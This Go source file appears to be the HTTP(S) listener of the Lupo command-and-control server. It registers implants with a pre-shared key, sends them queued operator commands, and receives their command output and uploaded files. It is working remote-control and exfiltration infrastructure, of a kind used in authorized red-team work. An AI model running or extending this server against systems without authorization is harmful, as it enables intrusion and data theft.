package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/google/uuid"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
)

// HTTPServerHandler - Handles all HTTPS/HTTPServer requests by passing data to handler sub-functions based on request type.
//
// Also sets HTTP server parameters and any other applicable HTTP server level variables.
func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
	// Setup webserver attributes like headers and response information
	w.Header().Set("Content-Type", "application/json")

	switch r.Method {
	case "GET":
		handleGetRequests(w, r)
	case "POST":
		handlePostRequests(w, r)
	default:
		// Invalid request type, stay silent don't respond to anything that isn't pre-defined
		return
	}
	return
}

// handleGetRequests - handles any incoming GET requests received by the HTTP(S) listener. Once all values are handled various Implant data update/response routines are executed where relevant based on the provided parameters.
//
// When requests are received, the URL parameters are extracted, validated and stored.
//
// HTTP GET Requests are expected to be provided as URL parameters like any other web request. The following parameters can be provided:
//
// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
//
// SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
//
// UUID - a unique UUID formatted identifier that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration. The UUID is not the primary identifier but is a secondary validation to prevent id bruteforcing or id mis-matches during the registration/de-registration processes.
//
// ImplantArch - a string for storing the Architecture of an implant's host system. This can be anything and is provided by the implant, but is expected to be something that identifies the host operating system and architecture.
//
// Update - an update interval in seconds that implants provide to tell the server how often it intends to check in. This value is used to determine if a session may have been killed.
//
// Data - a data payload, usually the output of execute commands on the implant. Once an implant executes a command, it can send the output to the data parameter where it will be printed to the user in the Lupo CLI.
//
// AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
//
// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
//
// Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
//
// FileName - a string value provided by an implant that is the filename for a file being sent to download or upload.
//
// File - a string value that is expected to be a base64 encoded string that is a file to download or upload.
func handleGetRequests(w http.ResponseWriter, r *http.Request) {
	getParams := r.URL.Query()

	var (
		getPSK                string
		getSessionID          int
		getUUID               uuid.UUID
		getImplantArch        string
		getUpdate             float64
		getData               string
		getAdditionalFunctions string
		additionalFunctions   map[string]interface{}
		getUsername           string
		getFileName           string
		getFile               string
		err                   error
	)
	var protocol string
	register := false
	remoteAddr := r.RemoteAddr

	if v := getParams["psk"]; len(v) > 0 {
		getPSK = v[0]
	} else {
		errorString := "http GET Request did not provide PSK, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

	if v := getParams["register"]; len(v) > 0 {
		register, err = strconv.ParseBool(v[0])
		if err != nil {
			errorString := "http GET Request to register implant was not a valid Boolean, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	}

	if v := getParams["sessionID"]; len(v) > 0 {
		getSessionID, err = strconv.Atoi(v[0])
		if err != nil {
			errorString := "http GET Request session ID was not a valid number, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		getSessionID = -1
	}

	if v := getParams["UUID"]; len(v) > 0 {
		getUUID, err = uuid.Parse(v[0])
		if err != nil {
			errorString := "http GET Request UUID was not a UUID, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		getUUID = core.ZeroedUUID
	}

	if v := getParams["arch"]; len(v) > 0 {
		getImplantArch = v[0]
	} else {
		getImplantArch = r.UserAgent()
	}

	if v := getParams["update"]; len(v) > 0 {
		getUpdate, err = strconv.ParseFloat(v[0], 64)
		if err != nil {
			errorString := "http GET Request update interval was not a valid number, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		getUpdate = 0
	}

	if v := getParams["data"]; len(v) > 0 {
		getData = v[0]
	} else {
		getData = ""
	}

	if v := getParams["functions"]; len(v) > 0 {
		getAdditionalFunctions = v[0]
		json.Unmarshal([]byte(getAdditionalFunctions), &additionalFunctions)
	} else {
		getAdditionalFunctions = ""
		additionalFunctions = nil
	}

	if v := getParams["user"]; len(v) > 0 {
		getUsername = v[0]
	} else {
		getUsername = "server"
	}

	if v := getParams["filename"]; len(v) > 0 {
		getFileName = v[0]
	}

	if v := getParams["file"]; len(v) > 0 {
		getFile = v[0]
	}

	if getPSK != PSK {
		errorString := "http GET Request Invalid PSK, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

	if register == true {
		implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, "")

		var protocol string
		if r.TLS != nil {
			protocol = "HTTPS"
		} else {
			protocol = "HTTP"
		}

		core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
		newSession := core.SessionID - 1

		response := map[string]interface{}{
			"sessionID": newSession,
			"UUID":      implant.ID,
		}

		json.NewEncoder(w).Encode(response)

		core.BroadcastSession(strconv.Itoa(newSession))

		return
	}

	sVal, ok := core.Sessions.Load(getSessionID)
	if !ok {
		// session not found, fall through to persistence mode check
	} else {
		session := sVal.(core.Session)
		if session.Implant.ID == getUUID && getUUID != core.ZeroedUUID {
			// Valid session
			goto SESSION_VALID
		}
	}

	if core.PersistenceMode {
		reconnectString := "Old implant with UUID: " + getUUID.String() + " connected, attempting to reestablish session..."
		core.LogData(reconnectString)
		core.WarningColorBold.Println(reconnectString)

		implant := core.RegisterImplant(getImplantArch, getUpdate, additionalFunctions, getUUID.String())

		if r.TLS != nil {
			protocol = "HTTPS"
		} else {
			protocol = "HTTP"
		}

		core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
		newSession := core.SessionID - 1

		response := map[string]interface{}{
			"sessionID": newSession,
			"UUID":      implant.ID,
		}

		json.NewEncoder(w).Encode(response)

		core.BroadcastSession(strconv.Itoa(newSession))

		return
	} else {
		errorString := "http GET Request Invalid UUID, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

SESSION_VALID:
	sVal, _ = core.Sessions.Load(getSessionID)
	session := sVal.(core.Session)

	if getData != "" {
		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
		if getUsername == "server" {
			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
		} else {
			currentWolf := core.Wolves[getUsername]
			data, err := url.QueryUnescape(getData)
			if err != nil {
				core.LogData("Session " + strconv.Itoa(getSessionID) + " error: could not unescape data returned by client")
			}
			data = strings.ReplaceAll(data, "\\", "\\\\")
			jsonData := `{"session":"` + strconv.Itoa(getSessionID) + `",` + `"data":"` + data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if getFileName != "" {
		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned the file: " + getFileName)

		if getFile == "" {
			core.LogData("Session " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
		} else {
			if getUsername == "server" {
				core.DownloadFile(getFileName, getFile)
			} else {
				currentWolf := core.Wolves[getUsername]
				jsonData := `{"filename":"` + getFileName + `","file":"` + getFile + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd, user string

	if session.Implant.Commands != nil && len(session.Implant.Commands) > 0 {
		cmd = session.Implant.Commands[0].Command
		user = session.Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	json.NewEncoder(w).Encode(response)


	if r.TLS != nil {
		protocol = "HTTPS"
	} else {
		protocol = "HTTP"
	}

	core.UpdateImplant(getSessionID, getUpdate, getImplantArch, additionalFunctions)
	core.SessionCheckIn(getSessionID, protocol)
}

// handlePostRequests - handles any incoming POST requests received by the HTTP(S) listener. Once all values are handled various Implant data update/response routines are executed where relevant based on the provided parameters.
//
// When requests are received, the Form parameters are extracted, validated and stored.
//
// HTTP POST Requests are expected to be provided as standard Form based parameters in the body of the request. The following parameters can be provided:
//
// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
//
// SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
//
// UUID - a unique UUID formatted identifier that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration. The UUID is not the primary identifier but is a secondary validation to prevent id bruteforcing or id mis-matches during the registration/de-registration processes.
//
// ImplantArch - a string for storing the Architecture of an implant's host system. This can be anything and is provided by the implant, but is expected to be something that identifies the host operating system and architecture.
//
// Update - an update interval in seconds that implants provide to tell the server how often it intends to check in. This value is used to determine if a session may have been killed.
//
// Data - a data payload, usually the output of execute commands on the implant. Once an implant executes a command, it can send the output to the data parameter where it will be printed to the user in the Lupo CLI.
//
// AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
//
// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
//
// Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
//
// FileName - a string value provided by an implant that is the filename for a file being sent to download or upload.
//
// File - a string value that is expected to be a base64 encoded string that is a file to download or upload.
func handlePostRequests(w http.ResponseWriter, r *http.Request) {

	// Read the request body
	body, bodyERR := ioutil.ReadAll(r.Body)
	if bodyERR != nil {
		http.Error(w, bodyERR.Error(), http.StatusInternalServerError)
		return
	}
	// Parse the request body as a URL-encoded query string
	parsedValues, parseERR := url.ParseQuery(string(body))
	if parseERR != nil {
		http.Error(w, parseERR.Error(), http.StatusBadRequest)
		return
	}

	postParams := parsedValues

	var (
		postPSK                string
		postSessionID          int
		postUUID               uuid.UUID
		postImplantArch        string
		postUpdate             float64
		postData               string
		postAdditionalFunctions string
		additionalFunctions    map[string]interface{}
		postUsername           string
		postFileName           string
		postFile               string
		err                    error
	)
	var protocol string
	register := false
	remoteAddr := r.RemoteAddr

	if v := postParams["psk"]; len(v) > 0 {
		postPSK = v[0]
	} else {
		errorString := "http POST Request did not provide PSK, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

	if v := postParams["register"]; len(v) > 0 {
		register, err = strconv.ParseBool(v[0])
		if err != nil {
			errorString := "http POST Request to register implant was not a valid Boolean, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	}

	if v := postParams["sessionID"]; len(v) > 0 {
		postSessionID, err = strconv.Atoi(v[0])
		if err != nil {
			errorString := "http POST Request session ID was not a valid number, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		postSessionID = -1
	}

	if v := postParams["UUID"]; len(v) > 0 {
		postUUID, err = uuid.Parse(v[0])
		if err != nil {
			errorString := "http POST Request UUID was not a UUID, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		postUUID = core.ZeroedUUID
	}

	if v := postParams["arch"]; len(v) > 0 {
		postImplantArch = v[0]
	} else {
		postImplantArch = r.UserAgent()
	}

	if v := postParams["update"]; len(v) > 0 {
		postUpdate, err = strconv.ParseFloat(v[0], 64)
		if err != nil {
			errorString := "http POST Request update interval was not a valid number, request ignored"
			core.LogData(errorString)
			ErrorHandler(errors.New(errorString))
			return
		}
	} else {
		postUpdate = 0
	}

	if v := postParams["data"]; len(v) > 0 {
		postData = v[0]
	} else {
		postData = ""
	}

	if v := postParams["functions"]; len(v) > 0 {
		postAdditionalFunctions = v[0]
		json.Unmarshal([]byte(postAdditionalFunctions), &additionalFunctions)
	} else {
		postAdditionalFunctions = ""
		additionalFunctions = nil
	}

	if v := postParams["user"]; len(v) > 0 {
		postUsername = v[0]
	} else {
		postUsername = "server"
	}

	if v := postParams["filename"]; len(v) > 0 {
		postFileName = v[0]
	}

	if v := postParams["file"]; len(v) > 0 {
		postFile = v[0]
	}

	if postPSK != PSK {
		errorString := "http POST Request Invalid PSK, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

	if register == true {
		implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, "")

		var protocol string
		if r.TLS != nil {
			protocol = "HTTPS"
		} else {
			protocol = "HTTP"
		}

		core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
		newSession := core.SessionID - 1

		response := map[string]interface{}{
			"sessionID": newSession,
			"UUID":      implant.ID,
		}

		json.NewEncoder(w).Encode(response)

		core.BroadcastSession(strconv.Itoa(newSession))

		return
	}

	sVal, ok := core.Sessions.Load(postSessionID)
	if !ok {
		// session not found, fall through to persistence mode check
	} else {
		session := sVal.(core.Session)
		if session.Implant.ID == postUUID && postUUID != core.ZeroedUUID {
			goto POST_SESSION_VALID
		}
	}

	if core.PersistenceMode {
		reconnectString := "Old implant with UUID: " + postUUID.String() + " connected, attempting to reestablish session..."
		core.LogData(reconnectString)
		core.WarningColorBold.Println(reconnectString)

		implant := core.RegisterImplant(postImplantArch, postUpdate, additionalFunctions, postUUID.String())

		if r.TLS != nil {
			protocol = "HTTPS"
		} else {
			protocol = "HTTP"
		}

		core.RegisterSession(core.SessionID, protocol, implant, remoteAddr, 0, "", "", "", "")
		newSession := core.SessionID - 1

		response := map[string]interface{}{
			"sessionID": newSession,
			"UUID":      implant.ID,
		}

		json.NewEncoder(w).Encode(response)

		core.BroadcastSession(strconv.Itoa(newSession))

		return
	} else {
		errorString := "http POST Request Invalid UUID, request ignored"
		core.LogData(errorString)
		ErrorHandler(errors.New(errorString))
		return
	}

POST_SESSION_VALID:
	sVal, _ = core.Sessions.Load(postSessionID)
	session := sVal.(core.Session)

	if postData != "" {
		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
		if postUsername == "server" {
			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
		} else {
			currentWolf := core.Wolves[postUsername]
			data, err := url.QueryUnescape(postData)
			if err != nil {
				core.LogData("Session " + strconv.Itoa(postSessionID) + " error: could not unescape data returned by client")
			}
			data = strings.ReplaceAll(data, "\\", "\\\\")
			jsonData := `{"session":"` + strconv.Itoa(postSessionID) + `",` + `"data":"` + data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if postFileName != "" {
		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned the file: " + postFileName)

		if postFile == "" {
			core.LogData("Session " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
		} else {
			if postUsername == "server" {
				core.DownloadFile(postFileName, postFile)
			} else {
				currentWolf := core.Wolves[postUsername]
				jsonData := `{"filename":"` + postFileName + `","file":"` + postFile + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd, user string

	if session.Implant.Commands != nil && len(session.Implant.Commands) > 0 {
		cmd = session.Implant.Commands[0].Command
		user = session.Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	json.NewEncoder(w).Encode(response)

	core.UpdateImplant(postSessionID, postUpdate, postImplantArch, additionalFunctions)

	if r.TLS != nil {
		protocol = "HTTPS"
	} else {
		protocol = "HTTP"
	}
	core.SessionCheckIn(postSessionID, protocol)
}
